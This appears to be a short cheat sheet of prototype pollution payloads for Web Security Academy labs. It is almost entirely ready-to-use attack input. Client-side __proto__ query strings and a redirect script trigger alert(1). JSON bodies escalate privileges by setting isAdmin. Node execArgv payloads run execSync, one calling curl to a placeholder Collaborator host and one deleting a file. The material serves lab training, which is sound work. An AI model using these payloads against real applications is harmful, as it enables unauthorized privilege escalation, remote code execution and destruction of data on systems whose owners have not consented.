use DOM Invader to scan and exploit
/?__proto__[foo]=bar > Object.prototype in console
/?__proto__[value]=data:,alert(1);
```
<script>
location="https://ID.web-security-academy.net/#__proto__[hitCallback]=alert%281%29";
</script>
```
Detecting server-side prototype in POST Request
```JSON
, "__proto__": {
    "foo":"boo"
}
```
Privilege escalation in prototype pollution
POST Request
verify > isAdmin:false > "foo":"boo" in JSON
```InSame data{ }
"__proto__": {
	"isAdmin":true
}
```
```
"constructor": {
	"prototype": {
		"json spaces":10
	} 
}

{
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
}
```
```
"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }

"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
```



